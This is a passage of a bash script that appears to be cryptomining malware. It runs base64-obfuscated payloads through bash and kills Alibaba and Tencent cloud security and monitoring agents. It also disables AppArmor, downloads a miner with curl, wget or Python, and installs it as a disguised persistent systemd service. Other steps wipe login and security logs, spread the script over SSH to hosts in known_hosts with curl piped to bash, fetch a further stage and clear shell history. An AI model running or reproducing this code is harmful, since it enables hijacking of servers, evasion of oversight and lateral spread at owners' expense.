cmVtb3ZlX2FlZ2lzKCl7CmlmIFsgLWQgIiR7QUVHSVNfSU5TVEFMTF9ESVJ9IiBdO3RoZW4KICAgIHVtb3VudCAke0FFR0lTX0lOU1RBTExfRElSfS9hZWdpc19kZWJ1ZwogICAgcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FlZ2lzX2NsaWVudAogICAgcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FlZ2lzX3VwZGF0ZQoJcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FsaWhpZHMKICAgIHJtIC1yZiAke0FFR0lTX0lOU1RBTExfRElSfS9nbG9iYWxjZmcvZG9tYWluY2ZnLmluaQpmaQp9Cgp1bmluc3RhbGxfc2VydmljZSgpIHsKICAgCiAgIGlmIFsgLWYgIi9ldGMvaW5pdC5kL2FlZ2lzIiBdOyB0aGVuCgkJL2V0Yy9pbml0LmQvYWVnaXMgc3RvcCAgPi9kZXYvbnVsbCAyPiYxCgkJcm0gLWYgL2V0Yy9pbml0LmQvYWVnaXMgCiAgIGZpCgoJaWYgWyAkTElOVVhfUkVMRUFTRSA9ICJHRU5UT08iIF07IHRoZW4KCQlyYy11cGRhdGUgZGVsIGFlZ2lzIGRlZmF1bHQgMj4vZGV2L251bGwKCQlpZiBbIC1mICIvZXRjL3J1bmxldmVscy9kZWZhdWx0L2FlZ2lzIiBdOyB0aGVuCgkJCXJtIC1mICIvZXRjL3J1bmxldmVscy9kZWZhdWx0L2FlZ2lzIiA+L2Rldi9udWxsIDI+JjE7CgkJZmkKICAgIGVsaWYgWyAtZiAvZXRjL2luaXQuZC9hZWdpcyBdOyB0aGVuCiAgICAgICAgIC9ldGMvaW5pdC5kL2FlZ2lzICB1bmluc3RhbGwKCSAgICBmb3IgKCh2YXI9MjsgdmFyPD01OyB2YXIrKykpIGRvCgkJCWlmIFsgLWQgIi9ldGMvcmMke3Zhcn0uZC8iIF07dGhlbgoJCQkJIHJtIC1mICIvZXRjL3JjJHt2YXJ9LmQvUzgwYWVnaXMiCgkJICAgIGVsaWYgWyAtZCAiL2V0Yy9yYy5kL3JjJHt2YXJ9LmQiIF07dGhlbgoJCQkJcm0gLWYgIi9ldGMvcmMuZC9yYyR7dmFyfS5kL1M4MGFlZ2lzIgoJCQlmaQoJCWRvbmUKICAgIGZpCgp9CgpzdG9wX2FlZ2lzX3BraWxsCnVuaW5zdGFsbF9zZXJ2aWNlCnJlbW92ZV9hZWdpcwp1bW91bnQgJHtBRUdJU19JTlNUQUxMX0RJUn0vYWVnaXNfZGVidWcKCgpwcmludGYgIiUtNDBzICU0MHNcbiIgIlVuaW5zdGFsbGluZyBhZWdpcyIgICJbICBPSyAgXSIKCgoK' | base64 -d | bash 2>/dev/null 1>/dev/null
	    echo 'IyEvYmluL2Jhc2gKCiNjaGVjayBsaW51eCBHZW50b28gb3MgCnZhcj1gbHNiX3JlbGVhc2UgLWEgfCBncmVwIEdlbnRvb2AKaWYgWyAteiAiJHt2YXJ9IiBdOyB0aGVuIAoJdmFyPWBjYXQgL2V0Yy9pc3N1ZSB8IGdyZXAgR2VudG9vYApmaQoKaWYgWyAtZCAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdCIgLWEgLW4gIiR7dmFyfSIgXTsgdGhlbgoJTElOVVhfUkVMRUFTRT0iR0VOVE9PIgplbHNlCglMSU5VWF9SRUxFQVNFPSJPVEhFUiIKZmkKCnN0b3BfYWVnaXMoKXsKCWtpbGxhbGwgLTkgYWVnaXNfY2xpID4vZGV2L251bGwgMj4mMQoJa2lsbGFsbCAtOSBhZWdpc191cGRhdGUgPi9kZXYvbnVsbCAyPiYxCglraWxsYWxsIC05IGFlZ2lzX2NsaSA+L2Rldi9udWxsIDI+JjEKICAgIHByaW50ZiAiJS00MHMgJTQwc1xuIiAiU3RvcHBpbmcgYWVnaXMiICJbICBPSyAgXSIKfQoKc3RvcF9xdWFydHooKXsKCWtpbGxhbGwgLTkgYWVnaXNfcXVhcnR6ID4vZGV2L251bGwgMj4mMQogICAgICAgIHByaW50ZiAiJS00MHMgJTQwc1xuIiAiU3RvcHBpbmcgcXVhcnR6IiAiWyAgT0sgIF0iCn0KCnJlbW92ZV9hZWdpcygpewppZiBbIC1kIC91c3IvbG9jYWwvYWVnaXMgXTt0aGVuCiAgICBybSAtcmYgL3Vzci9sb2NhbC9hZWdpcy9hZWdpc19jbGllbnQKICAgIHJtIC1yZiAvdXNyL2xvY2FsL2FlZ2lzL2FlZ2lzX3VwZGF0ZQpmaQp9CgpyZW1vdmVfcXVhcnR6KCl7CmlmIFsgLWQgL3Vzci9sb2NhbC9hZWdpcyBdO3RoZW4KCXJtIC1yZiAvdXNyL2xvY2FsL2FlZ2lzL2FlZ2lzX3F1YXJ0egpmaQp9CgoKdW5pbnN0YWxsX3NlcnZpY2UoKSB7CiAgIAogICBpZiBbIC1mICIvZXRjL2luaXQuZC9hZWdpcyIgXTsgdGhlbgoJCS9ldGMvaW5pdC5kL2FlZ2lzIHN0b3AgID4vZGV2L251bGwgMj4mMQoJCXJtIC1mIC9ldGMvaW5pdC5kL2FlZ2lzIAogICBmaQoKCWlmIFsgJExJTlVYX1JFTEVBU0UgPSAiR0VOVE9PIiBdOyB0aGVuCgkJcmMtdXBkYXRlIGRlbCBhZWdpcyBkZWZhdWx0IDI+L2Rldi9udWxsCgkJaWYgWyAtZiAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdC9hZWdpcyIgXTsgdGhlbgoJCQlybSAtZiAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdC9hZWdpcyIgPi9kZXYvbnVsbCAyPiYxOwoJCWZpCiAgICBlbGlmIFsgLWYgL2V0Yy9pbml0LmQvYWVnaXMgXTsgdGhlbgogICAgICAgICAvZXRjL2luaXQuZC9hZWdpcyAgdW5pbnN0YWxsCgkgICAgZm9yICgodmFyPTI7IHZhcjw9NTsgdmFyKyspKSBkbwoJCQlpZiBbIC1kICIvZXRjL3JjJHt2YXJ9LmQvIiBdO3RoZW4KCQkJCSBybSAtZiAiL2V0Yy9yYyR7dmFyfS5kL1M4MGFlZ2lzIgoJCSAgICBlbGlmIFsgLWQgIi9ldGMvcmMuZC9yYyR7dmFyfS5kIiBdO3RoZW4KCQkJCXJtIC1mICIvZXRjL3JjLmQvcmMke3Zhcn0uZC9TODBhZWdpcyIKCQkJZmkKCQlkb25lCiAgICBmaQoKfQoKc3RvcF9hZWdpcwpzdG9wX3F1YXJ0egp1bmluc3RhbGxfc2VydmljZQpyZW1vdmVfYWVnaXMKcmVtb3ZlX3F1YXJ0egoKcHJpbnRmICIlLTQwcyAlNDBzXG4iICJVbmluc3RhbGxpbmcgYWVnaXNfcXVhcnR6IiAgIlsgIE9LICBdIgoKCgo=' | base64 -d | bash 2>/dev/null 1>/dev/null
	      pkill aliyun-service 2>/dev/null 1>/dev/null
	      if [ -f "/etc/init.d/agentwatch" ]; then rm -rf /etc/init.d/agentwatch 2>/dev/null 1>/dev/null ; fi
	      if [ -f "/usr/sbin/aliyun-service" ]; then rm -fr /usr/sbin/aliyun-service 2>/dev/null 1>/dev/null ; fi
	      if [ -d "/usr/local/aegis/" ]; then rm -rf /usr/local/aegis* 2>/dev/null 1>/dev/null ; fi
	        if type systemctl 2>/dev/null 1>/dev/null; then systemctl stop aliyun.service 2>/dev/null 1>/dev/null ; else service aliyun.service stop 2>/dev/null 1>/dev/null ; fi
		  if type systemctl 2>/dev/null 1>/dev/null; then systemctl disable aliyun.service 2>/dev/null 1>/dev/null ; else if [ -f "/etc/init.d/aliyun" ]; then rm -fr /etc/init.d/aliyun 2>/dev/null 1>/dev/null ; fi ; fi
		    if type systemctl 2>/dev/null 1>/dev/null; then systemctl stop bcm-agent 2>/dev/null 1>/dev/null ; else service bcm-agent stop 2>/dev/null 1>/dev/null ; fi
		      if type yum 2>/dev/null 1>/dev/null; then yum remove bcm-agent -y 2>/dev/null 1>/dev/null ; fi
		        if type apt-get 2>/dev/null 1>/dev/null; then apt-get remove bcm-agent -y 2>/dev/null 1>/dev/null ; fi
		elif ps aux | grep -i '[y]unjing' 2>/dev/null 1>/dev/null; then
			if [ -f "/usr/local/qcloud/stargate/admin/uninstall.sh" ]; then /usr/local/qcloud/stargate/admin/uninstall.sh 2>/dev/null 1>/dev/null ; fi
			if [ -f "/usr/local/qcloud/YunJing/uninst.sh" ]; then /usr/local/qcloud/YunJing/uninst.sh 2>/dev/null 1>/dev/null ; fi
			if [ -f "/usr/local/qcloud/monitor/barad/admin/uninstall.sh" ]; then /usr/local/qcloud/monitor/barad/admin/uninstall.sh 2>/dev/null 1>/dev/null ; fi
fi

if ps aux | grep -i '[a]liyun'; then
  ${CURL_CMD} http://update.aegis.aliyun.com/download/uninstall.sh | bash
  ${CURL_CMD} http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
  pkill aliyun-service
  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
  rm -rf /usr/local/aegis*
  systemctl stop aliyun.service
  systemctl disable aliyun.service
  service bcm-agent stop
  yum remove bcm-agent -y
  apt-get remove bcm-agent -y
elif ps aux | grep -i '[y]unjing'; then
  /usr/local/qcloud/stargate/admin/uninstall.sh
  /usr/local/qcloud/YunJing/uninst.sh
  /usr/local/qcloud/monitor/barad/admin/uninstall.sh
fi
if [ -f /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh ]; then
  /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh stop && /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh remove && rm -rf /usr/local/cloudmonitor	
else
  if [ -f /usr/local/cloudmonitor/CmsGoAgent.linux-amd64 ]; then
    /usr/local/cloudmonitor/CmsGoAgent.linux-amd64 stop && /usr/local/cloudmonitor/CmsGoAgent.linux-amd64 uninstall && rm -rf /usr/local/cloudmonitor	
  else
    echo "ali cloud monitor not running"
  fi
fi
service apparmor stop
systemctl disable apparmor
service aliyun.service stop
systemctl disable aliyun.service
ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 %
rm -rf /usr/local/aegis
}

clmo() {
if ps aux | grep -i '[a]liyun'; then
echo "this is ali cloud"
number=$(ps -ef|grep -i dun|grep -v grep|wc -l)
until [ "$number" -eq 0 ]; do
systemctl stop aliyun
systemctl stop aegis
ps -ef|grep -i aegis|awk '{print $2}'|xargs kill -HUP
number=$(ps -ef|grep -i dun|grep -v grep|wc -l)
done

while  [ -d /usr/local/aegis ]
do 
ps -ef|grep -i AliSecGuard|grep -v grep |awk '{print $2}'|xargs kill -HUP 
path=$(ps -ef|grep AliSecGuard|grep -v grep|awk '{print $NF}')
num=$(ps -ef|grep AliSecGuard|grep -v grep|awk '{print $NF}'|wc -l)
if [ $num -gt 0 ]
then 
echo "$path" exist
$path --stopdriver
else
echo "no AliSecGuard process"
fi
rm -rf /usr/local/aegis
done
else 
echo "it's not ali cloud"
fi
}
download_f(){
export MOHOME="/usr/share"
cd ${MOHOME} 

if [ -f ${MOHOME}/\[cmake\] ];then
    MSIZE=$(du -sm ${MOHOME}/\[cmake\]|awk '{print $1}')
	if (( "$MSIZE" > 2 ))
    then 
        echo "miner binary exists"
    else 
    ${CHATTR} -ia ${MOHOME}/\[cmake\]
	rm -f ${MOHOME}/\[cmake\]
    if (( "$WSIZE" > 100 ))
	then
	${WGET_CMD} --tries=10 --timeout=1000 -O ${MOHOME}/crypto  ${miner_url}
	elif (( "$CSIZE" > 100 ))
	then
	${CURL_CMD} -fsSL ${miner_url} -o ${MOHOME}/crypto
	else
	python -c "import urllib2; print urllib2.urlopen('${miner_url}').read()" >${MOHOME}/crypto
	fi
        fi
else 
    echo "miner not exist"
    if (( "$WSIZE" > 100 ))
	then
	${WGET_CMD} --tries=10 --timeout=1000 -O ${MOHOME}/crypto  ${miner_url}
	elif (( "$CSIZE" > 100 ))
	then
	${CURL_CMD} -fsSL ${miner_url} -o ${MOHOME}/crypto
	else
	python -c "import urllib2; print urllib2.urlopen('${miner_url}').read()" >${MOHOME}/crypto
	fi  
fi

if [ -f ${MOHOME}/crypto ];then
CRYPTOSIZE=$(du -sk ${MOHOME}/crypto|awk '{print $1}')
echo $CRYPTOSIZE
if (( "$CRYPTOSIZE" > 1024 ))
    then 
    tar -xf "${MOHOME}/crypto" 2>/dev/null 1>/dev/null && chmod a+x ${MOHOME}/[cmake] && rm -f ${MOHOME}/crypto
    else
    echo "fist download failed"
fi
else
echo "crypto file not exist"
fi

if [ -f ${MOHOME}/\[cmake\] ];then
    MSIZE=$(du -sm ${MOHOME}/\[cmake\]|awk '{print $1}')
	if (( "$MSIZE" > 2 ))
    then 
        echo "miner binary exists"
    else 
    ${CHATTR} -ia ${MOHOME}/\[cmake\]
	rm -f ${MOHOME}/\[cmake\]
    if (( "$WSIZE" > 100 ))
	then
	${WGET_CMD} --tries=10 --timeout=1000 -O ${MOHOME}/crypto  ${miner_url_backup}
	elif (( "$CSIZE" > 100 ))
	then
	${CURL_CMD} -fsSL ${miner_url_backup} -o ${MOHOME}/crypto
	else
	python -c "import urllib2; print urllib2.urlopen('${miner_url_backup}').read()" >${MOHOME}/crypto
	fi
	fi
else 
    echo "miner not exist"
    if (( "$WSIZE" > 100 ))
	then
	${WGET_CMD} --tries=10 --timeout=1000 -O ${MOHOME}/crypto  ${miner_url_backup}
	elif (( "$CSIZE" > 100 ))
	then
	${CURL_CMD} -fsSL ${miner_url_backup} -o ${MOHOME}/crypto
	else
	python -c "import urllib2; print urllib2.urlopen('${miner_url_backup}').read()" >${MOHOME}/crypto
	fi  
fi
if [ -f ${MOHOME}/crypto ];then
CRYPTOSIZE=$(du -sk ${MOHOME}/crypto|awk '{print $1}')
echo $CRYPTOSIZE
if (( "$CRYPTOSIZE" > 1024 ))
    then
    tar -xf "${MOHOME}/crypto" 2>/dev/null 1>/dev/null && chmod a+x ${MOHOME}/[cmake] && rm -f ${MOHOME}/crypto
    else
    echo "fist download failed"
fi
else
echo "crypto file not exist"
fi
}
setup_s(){
grep -q cmake /etc/systemd/system/cmake.service
if [ $? -eq 0 ]
then 
	echo service exist
else
	rm -f /etc/systemd/system/cmake.service
cat >/tmp/ext4.service << EOLB
[Unit]
Description=crypto system service
After=network.target
[Service]
Type=forking
GuessMainPID=no
ExecStart=${MOHOME}/[cmake]
WorkingDirectory=${MOHOME}
Restart=always
Nice=0 
RestartSec=3
[Install]
WantedBy=multi-user.target
EOLB
fi
mv /tmp/ext4.service /etc/systemd/system/cmake.service 
systemctl daemon-reload
systemctl start cmake
systemctl enable cmake
}

localgo() {
echo > /var/spool/mail/root
echo > /var/log/wtmp
echo > /var/log/secure
if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'curl -o-  ${mainurl/b.sh} | bash >/dev/null 2>&1 &' & done
fi
}

exe_remo(){
if [ ! -f "/var/tmp/.psla" ]; then
localgo
echo 'lockfile' > /var/tmp/.psla
sleep 10
${CURL_CMD} -fsSL ${mainurl}/s/s.sh | bash 
${CHATTR} +i /var/tmp/.psla
history -c
else
  echo "replay .. i know this server ..."
fi 
echo "[*] Setup complete"  
history -c
}
echo "=============begin check_exist"
check_exist
echo "=============begin m_command"
m_command
echo "=============begin env_set"
env_set
echo "=============begin download_f"
download_f
echo "=============begin setup_s"
setup_s
echo "=============begin makesshaxx"
makesshaxx
echo "=============begin ins_package"
ins_package
echo "=============begin exec_hide2"
exec_hide2
echo "=============begin clean_cron"
clean_cron
echo "=============begin lock_cron"
lock_cron
echo "=============begin clmo"
clmo
echo "=============begin clean_monitor"
clean_monitor
echo "=============begin exe_remo"
exe_remo
